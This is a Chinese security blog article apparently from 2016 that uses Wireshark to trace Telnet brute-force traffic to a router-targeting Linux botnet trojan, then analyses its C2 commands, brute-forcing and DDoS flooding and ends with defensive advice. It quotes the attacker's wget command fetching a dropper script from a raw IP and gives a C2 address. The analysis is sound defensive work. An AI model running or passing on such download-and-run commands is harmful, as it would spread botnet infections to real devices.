<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">WireShark黑客发现之旅（8）—针对路由器的Linux木马</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">聚锋实验室</a> <span class="bull">·</span> <time title="2016/04/25 10:24" ui-time="" datetime="2016/04/25 10:24" class="published ng-binding ng-isolate-scope">2016/04/25 10:24</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p><strong>Author：Mr.Right、Gongmo</strong><br><strong>申明：</strong>文中提到的攻击方式仅为曝光、打击恶意网络攻击行为，切勿模仿，否则后果自负。</p><h1>0x00 前言</h1><hr><p>路由器木马，其主要目标是控制网络的核心路由设备；一旦攻击成功，其危害性远大于一台主机被控。</p><p>如果仅仅在路由器上面防范该类木马，那也是不够的，有很多Linux服务器违规开放Telnet端口，且使用了弱口令，一样可以中招。下面我们就一起来回顾一起真实案例。</p><h1>0x01 发现异常</h1><hr><p>在对客户某服务器区域进行安全监测时发现某服务器通信流量存在大量Telnet协议。截取一段数据，进行协议统计：</p><p><img alt="p1" img-src="c0413a2adb383534d650aaba6d6afe2e4227a4ff.jpg"></p><p>Telnet协议一般为路由器管理协议，服务器中存在此协议可初步判断为异常流量。继续进行端口、IP走向统计：发现大量外部IP通过Tcp23端口（Telnet）连接该服务器。</p><p><img alt="p2" img-src="e33e2a8909b7acc35c85da0a15f745cc8ba84025.jpg"></p><p>此统计可说明：</p><ol><li>该服务器违规开放了TCP23端口；</li><li>该服务器遭到大量Telnet攻击，有可能是暴力破解，也有可能是已经成功连接。</li></ol><p>挑选通信量较大的IP，筛选通信双向数据：</p><p><img alt="p3" img-src="1a685ec74da3d4336ec2e66a25b9cb31dcda26e4.jpg"></p><p>查看Telnet数据，发现已经成功连接该服务器。</p><p><img alt="p4" img-src="55850beb1dfb12c10c9680cbd380714582d718b2.jpg"></p><p>数据中还存在大量Telnet扫描探测、暴力破解攻击，在此不再详述。</p><h1>0x02 获取样本</h1><hr><p>为进一步查看Telnet通信内容，Follow TcpStream。</p><p><img alt="p5" img-src="29c795c3fed6ea1e7b0911e9d5229945e718fadc.jpg"></p><p>将内容复制粘贴至文本编辑器：</p><p><img alt="p6" img-src="941c3adc17461f7798a6caf00ddf6c4fcd1870f5.jpg"></p><p>发现一段自动下载命令：</p><pre><code>#!bash
wget http://208.67.1.42/bin.sh;
wget1 http://208.67.1.42/bin2.sh。
</code></pre><p>连接<code>http://208.67.1.42/bin.sh</code>可发现该脚本文件内容为自动下载获取木马，且木马可感染ARM、MIPS、X86、PowerPC等架构的设备。</p><p><img alt="p7" img-src="71359a7bc5ee5d93f0922cf35a5491e08dba0a36.jpg"></p><h1>0x03 木马分析</h1><hr><p>（<strong>注：本章节不属于Wireshark分析范畴，本文仅以jackmyx86分析为例</strong>）</p><p>该木马文件是ELF格式的，影响的操作系统包括：</p><p><img alt="p8" img-src="7bd84ff150b406226c1a846777628a75b8021b24.jpg"></p><p>从上图中判断木马下载的类型分别是：Mipsel,misp,x86(其实这个是x64),arm,x86(i586,i686)等。</p><p>从截获的<code>*.sh</code>文件看，<code>*.sh</code>脚本想删除这些目录和内容，并且关闭一些进程。</p><p><img alt="p9" img-src="5d6ca5e9300b1f0a0d3b3ab20459cf1416342ca4.jpg"></p><p>首先得到了一个”Art of war”的字符串（看来黑客是个文艺青年）。</p><p><img alt="p10" img-src="502eca9327df35b2e172b9ba9b76c84c88445625.jpg"></p><p>接着尝试打开路由器配置文件。</p><p><img alt="p11" img-src="f8c4e08067cfdb6a5b8be0284531e58264b2e781.jpg"></p><p>在配置文件里查找字符串00000000，如果找到就直接填充0；</p><p><img alt="p12" img-src="c3b1e8eb784acff3e912dfe31ddfefb6d5da8f11.jpg"></p><p>在初始化函数中：尝试建立socket连接，连接地址为：208.67.1.194:164。</p><p><img alt="p13" img-src="17eb1b39980580fecd61452a32a7938ce5ad0056.jpg"></p><p>尝试连接服务器，等待远端服务器应答。</p><p><img alt="p14" img-src="c040837f1fa9bb2d8cbb1dc9b37977e15eceb7fc.jpg"></p><p>服务器发送“ping”命令后，客户端返回“pong”表示已经连接成功。当发送“GETLOCALIP”后，返回控制端的本机IP。当服务器发送SCANNER后，根据ON或者OFF来控制是否要扫描指定IP，进行暴力破解。当发送“UDP”命令时候，向指定的IP地址发送大量UDP无效数据包。</p><p><img alt="p15" img-src="e2b176b908e29706954d67480a11050feb100e06.jpg"></p><p><img alt="p16" img-src="d722f86a2e2b4bdefc1664cdc2365fa2410be7cb.jpg"></p><p><img alt="p17" img-src="cbaa10c15543be2ebd4fe9403e56a90d2c3a37ff.jpg"></p><p>下图是木马尝试获得路由器的用户名和密码匹配，企图暴力破解账户和密码。</p><p><img alt="p18" img-src="51a46d9d3f187df67493f8e8d60e45e9cfbaa8ab.jpg"></p><p><img alt="p19" img-src="de63c2e21310ba1a78e7f33ed5197ba309a2f462.jpg"></p><p><img alt="p20" img-src="e782599233ab756d67398c5f8bf61efc0d45025b.jpg"></p><p>在被控制之后，跟随服务器指定的IP，发送大量随机生成的长度为0x400的字符串数据，进行DDOS攻击。下图是发送垃圾数据,进行DDOS攻击。</p><p><img alt="p21" img-src="da085ba07ec40ececfa5abc66779b09950b7eb72.jpg"></p><p><img alt="p22" img-src="67cc1bcd6af7b30f347d5399b450193bc02abaf5.jpg"></p><p>随机数据生成的伪代码如下：</p><p><img alt="p23" img-src="6821d6d6f28502ed3814c116a7f3e582462c974d.jpg"></p><p>根据网址追溯到攻击者的网页和twitter账号。</p><p><img alt="p24" img-src="c5ddb63b001e53d5f7346dcc3542672dcc56db96.jpg"></p><p><img alt="p25" img-src="360a24d3123d1e54d034082b9d1ca8e1eec56072.jpg"></p><p><img alt="p26" img-src="6de3abb27fdb8a7375622bed17e3265b9133e0d9.jpg"></p><h1>0x04 总结</h1><hr><ol><li>路由器的管理如非必须，尽量不开放互联网管理通道</li><li>路由器管理密码必须强口令、最好超强</li><li>Linux服务器一般不要打开Telnet服务</li><li>该木马一般利用爆破和漏洞来攻击路由器或开启Telnet服务的Linux服务器，中招后接受木马作者的控制，最后进行大量DDOS攻击</li></ol><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">聚锋实验室</span> <span class="reply-time">2016-06-17 12:35:05</span></div><p></p><p>@lack 是的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lack</span> <span class="reply-time">2016-05-09 08:14:26</span></div><p></p><p>楼主，那个汇编跟踪工具是ollydbg吗</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mr.Right</span> <span class="reply-time">2016-05-03 09:34:45</span></div><p></p><p>@好基友一辈子 您是指什么日志？我们有很多事件不是通过日志来分析的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">好基友一辈子</span> <span class="reply-time">2016-05-01 15:03:42</span></div><p></p><p>楼主写了这么多文章，可否把日志一起发出来看看</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">给你个台阶</span> <span class="reply-time">2016-04-26 00:12:45</span></div><p></p><p>@文艺青年黑客 奥 原来说的就是你哈 文艺青年：）</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">文艺青年黑客</span> <span class="reply-time">2016-04-25 17:44:29</span></div><p></p><p>人生不能装，那跟咸鱼有什么区别。</p><p></p></div></div></div></div></div></main>